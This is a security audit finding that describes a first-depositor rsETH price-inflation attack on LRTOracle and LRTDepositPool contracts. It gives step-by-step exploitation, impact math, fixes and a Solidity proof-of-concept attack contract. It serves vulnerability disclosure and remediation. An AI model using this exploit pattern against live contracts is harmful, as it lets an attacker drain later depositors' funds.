### Title
First-Depositor rsETH Price Inflation via Direct ETH Donation and Zero `pricePercentageLimit` Guard — (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`)

---

### Summary

An unprivileged attacker who acts as the first depositor can inflate `rsETHPrice` from `1e18` to approximately `1e36` by (1) minting 1 wei rsETH, (2) donating ETH directly to the deposit pool, and (3) calling the public `updateRSETHPrice()`. The price-increase guard is unconditionally disabled when `pricePercentageLimit == 0` (the storage default). After the manipulation, every subsequent depositor receives near-zero rsETH for their ETH, and the attacker's single wei of rsETH represents essentially all pool value.

---

### Finding Description

**Step 1 — Bootstrap price to `1e18`.**
`updateRSETHPrice()` is `public whenNotPaused` with no role restriction. When `rsethSupply == 0` it hard-codes `rsETHPrice = 1 ether` and returns. [1](#0-0) 

**Step 2 — Mint 1 wei rsETH.**
`depositETH(0, "")` with `msg.value = 1 wei` passes `_beforeDeposit` because `minAmountToDeposit` defaults to `0`. `getRsETHAmountToMint` computes `(1 * 1e18) / 1e18 = 1`, so 1 wei rsETH is minted. `rsethSupply` is now `1`. [2](#0-1) [3](#0-2) 

**Step 3 — Inflate `totalETHInProtocol` via direct donation.**
`LRTDepositPool` has an open `receive()` function. Sending 1 ETH directly raises `address(this).balance` to `~1e18`, which `getETHDistributionData` counts verbatim as `ethLyingInDepositPool`. [4](#0-3) [5](#0-4) 

**Step 4 — Call `updateRSETHPrice()` to set price to `~1e36`.**
With `rsethSupply = 1` and `totalETHInProtocol ≈ 1e18`:

```
newRsETHPrice = divWad(1e18, 1)
              = 1e18 * 1e18 / 1
              = 1e36
``` [6](#0-5) [7](#0-6) 

**Step 5 — Price-increase guard is a no-op.**
The guard that would revert a non-manager on an excessive price increase is gated by `pricePercentageLimit > 0`. Since `pricePercentageLimit` is a plain storage variable that is never set in `initialize` or `reinitialize`, it defaults to `0`, making `isPriceIncreaseOffLimit` permanently `false` until an admin explicitly calls `setPricePercentageLimit`. [8](#0-7) 

`rsETHPrice` and `highestRsethPrice` are both written to `1e36`. [9](#0-8) [10](#0-9) 

---

### Impact Explanation

After the manipulation, every subsequent depositor calling `depositETH` or `depositAsset` receives:

```
rsethAmountToMint = (amount * assetPrice) / rsETHPrice
                  = (1e18 * 1e18) / 1e36
                  = 1   (for a full 1 ETH deposit)
```

A deposit smaller than `rsETHPrice / assetPrice = 1e18` wei rounds to **0 rsETH**, causing the transaction to revert only if the caller set `minRSETHAmountExpected > 0`. Callers who pass `0` silently lose their ETH. The attacker's 1 wei rsETH represents virtually 100% of pool equity, enabling them to drain all subsequently deposited ETH through the withdrawal path. This constitutes **direct theft of user funds** and **protocol insolvency**.

---

### Likelihood Explanation

- No privileged role is required; `updateRSETHPrice()` and `depositETH()` are both callable by any EOA.
- `minAmountToDeposit` and `pricePercentageLimit` both default to `0`, so no admin action is needed to enable the attack.
- The attack is viable in the window between deployment and the admin calling `setPricePercentageLimit` — which has no deadline or enforcement.
- The cost is 1 ETH (the donation), which is recovered once the attacker redeems their rsETH against the inflated pool.

---

### Recommendation

1. **Enforce a non-zero `pricePercentageLimit` at initialization.** Set a safe default (e.g., `1e16` = 1%) inside `initialize` so the guard is active from block 0.
2. **Seed the pool atomically during deployment.** Mint a meaningful initial rsETH supply (e.g., 1e15 wei) to a dead address so `rsethSupply` is never `1` in production.
3. **Reject direct ETH donations or exclude them from TVL.** Track only ETH received through controlled entry points (`depositETH`, `receiveFromNodeDelegator`, etc.) rather than using raw `address(this).balance`.
4. **Set `minAmountToDeposit` to a non-trivial value** (e.g., `0.001 ether`) at initialization to prevent dust deposits.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Fork test — run against a local Anvil fork with deployed contracts

interface ILRTOracle  { function updateRSETHPrice() external; function rsETHPrice() external view returns (uint256); }
interface ILRTDepositPool { function depositETH(uint256 min, string calldata ref) external payable; }

contract FirstDepositorPoC {
    ILRTOracle      oracle;
    ILRTDepositPool pool;

    constructor(address _oracle, address _pool) {
        oracle = ILRTOracle(_oracle);
        pool   = ILRTDepositPool(_pool);
    }

    function attack() external payable {
        // Step 1: bootstrap price (supply == 0 → rsETHPrice = 1e18)
        oracle.updateRSETHPrice();

        // Step 2: mint 1 wei rsETH
        pool.depositETH{value: 1}(0, "");

        // Step 3: donate 1 ETH to inflate totalETHInProtocol
        payable(address(pool)).transfer(1 ether);

        // Step 4: inflate price — pricePercentageLimit == 0 so guard is skipped
        oracle.updateRSETHPrice();

        // Assert: rsETHPrice is now ~1e36
        require(oracle.rsETHPrice() > 1e30, "attack failed");
    }

    // Step 5 (separate tx): victim deposits 1 ETH, receives only 1 wei rsETH
    // victim.depositETH{value: 1 ether}(0, "");
    // rsethAmountToMint = (1e18 * 1e18) / 1e36 = 1 wei
}
```

### Citations

**File:** contracts/LRTOracle.sol (L218-222)
```text
        if (rsethSupply == 0) {
            rsETHPrice = 1 ether;
            highestRsethPrice = 1 ether;
            return;
        }
```

**File:** contracts/LRTOracle.sol (L250-250)
```text
        uint256 newRsETHPrice = (totalETHInProtocol - protocolFeeInETH).divWad(rsethSupply);
```

**File:** contracts/LRTOracle.sol (L256-257)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
```

**File:** contracts/LRTOracle.sol (L294-296)
```text
        if (newRsETHPrice > highestRsethPrice) {
            highestRsethPrice = newRsETHPrice;
        }
```

**File:** contracts/LRTOracle.sol (L313-313)
```text
        rsETHPrice = newRsETHPrice;
```

**File:** contracts/LRTDepositPool.sol (L58-58)
```text
    receive() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L480-481)
```text
        ethLyingInDepositPool = address(this).balance;

```

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTDepositPool.sol (L657-659)
```text
        if (depositAmount == 0 || depositAmount < minAmountToDeposit) {
            revert InvalidAmountToDeposit();
        }
```

**File:** contracts/utils/WadMath.sol (L25-27)
```text
    function divWad(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x.mulDiv(WAD, y);
    }
```
